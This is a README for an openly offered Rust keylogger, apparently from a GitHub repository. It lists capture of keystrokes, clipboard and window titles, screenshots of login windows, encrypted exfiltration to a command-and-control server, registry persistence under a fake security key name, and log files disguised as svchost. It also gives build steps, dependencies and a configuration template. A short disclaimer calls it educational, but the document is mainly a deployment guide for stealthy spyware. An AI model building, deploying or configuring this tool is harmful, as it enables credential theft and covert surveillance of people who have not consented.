# Keylogger

An advanced keylogger written in Rust that captures keystrokes, active window titles, encrypts the data, and sends it to a Command and Control (C2) server.

## Features

- **Keystroke Logging**: Captures all key presses, including special keys like Enter, Space, Backspace, etc. Fully handles Shift and CapsLock for proper case conversion and symbols.
- **Window Title Capture**: Records the title of the active window for each keystroke.
- **Clipboard Monitoring**: Logs changes to the clipboard content.
- **Screenshot Capture**: Takes screenshots when typing in windows with "password" or "login" in the title.
- **Encryption**: Uses AES-256-GCM to encrypt logged data before transmission.
- **C2 Communication**: Sends encrypted logs to a specified C2 server via HTTPS POST every 30 seconds.
- **Persistence**: On Windows, adds itself to the registry for auto-start on boot.
- **Stealth Mode**: Hides the console window on Windows.
- **Local Logging**: Also saves logs to a file (`%APPDATA%\svchost.log` on Windows, or `svchost.log` locally).

## Requirements

- Rust (latest stable version)
- Windows (for full functionality like persistence and window title capture)

## Dependencies

Add the following to your `Cargo.toml`:

```toml
[dependencies]
aes-gcm = "0.10"
rand = "0.8"
rdev = "0.5"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
toml = "0.8"
hex = "0.4"
tokio = { version = "1.0", features = ["net", "io-util"] }
winreg = "0.52"
windows = { version = "0.52", features = ["Win32_UI_WindowsAndMessaging", "Win32_Foundation"] }
clipboard = "0.5"
screenshots = "0.8"
image = "0.24"
reqwest = { version = "0.11", features = ["json", "rustls-tls"] }
```

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/JonusNattapong/Keylogger.git
   cd Keylogger
   ```

2. Copy the example configuration file:
   ```bash
   cp config.toml.example config.toml
   ```

3. Edit `config.toml` to customize settings (see Configuration section below).

4. Build the project:
   ```bash
   cargo build --release
   ```

## Configuration

The keylogger uses a `config.toml` file for all configuration. Copy `config.toml.example` to `config.toml` and customize the values:

```toml
[c2]
# C2 server URL for sending encrypted logs
url = "https://your-c2-server.com/logs"
# Interval in seconds between C2 communications
interval_seconds = 30

[encryption]
# 32-byte encryption key in hex format (change this for each deployment)
# Generate a new random key: openssl rand -hex 32
key_hex = "4242424242424242424242424242424242424242424242424242424242424242"

[logging]
# Local log file name
file_name = "svchost.log"

[clipboard]
# Interval in seconds between clipboard checks
monitor_interval_seconds = 5

[screenshots]
# Directory to store screenshots
directory = "screenshots"

[persistence]
# Windows registry key name for persistence
registry_key = "WindowsSecurityHealth"
```

**Security Note**: The `config.toml` file contains sensitive information (encryption key) and is automatically excluded from version control via `.gitignore`. Never commit your actual configuration file.

## Usage

Run the executable:

```bash
./target/release/keylogger
```

The program will run in the background, logging keystrokes and sending data to the C2 server.

## Disclaimer

This software is for educational purposes only. Unauthorized use of keyloggers may violate privacy laws and ethical standards. Use responsibly and only on systems you own or have explicit permission to monitor.

## License

[Specify your license here, e.g., MIT]

